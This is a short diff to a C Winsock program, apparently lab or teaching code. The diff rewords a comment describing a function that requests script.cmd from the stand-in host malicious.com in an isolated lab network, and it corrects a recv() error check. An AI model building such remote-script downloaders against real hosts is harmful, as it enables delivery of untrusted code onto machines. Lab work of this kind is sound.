@@ -96,10 +96,10 @@ int main() {
 }
 
 /*
- * Sends a GET request for script.cmd to malicious.com. Note that
- * in this example malicious.com is an arbitrary domain name that 
- * is configured as part of a local DNS lab setup. Attempting to 
- * run this script outside of a lab environemnt is not advised.
+ * Sends a GET request for script.cmd to malicious.com. Note that in this example 
+ * malicious.com is an arbitrary domain name that is used a placeholder in an isolated
+ * lab network. Attempting to run this program outside of a lab environemnt will
+ * produce non-deterministic results.
  * 
  * Method provided by https://docs.microsoft.com/en-us/windows/win32/winsock/getting-started-with-winsock
  * 
@@ -133,7 +133,7 @@ int RetrieveScript(SOCKET sock, char* recvbuf) {
 	}
 
 	recvd = recv(sock, recvbuf, SCRIPT_LEN, 0);
-	if (recvd != 0) {
+	if (recvd == SOCKET_ERROR) {
 		return RECV_FAILURE;
 	}
 
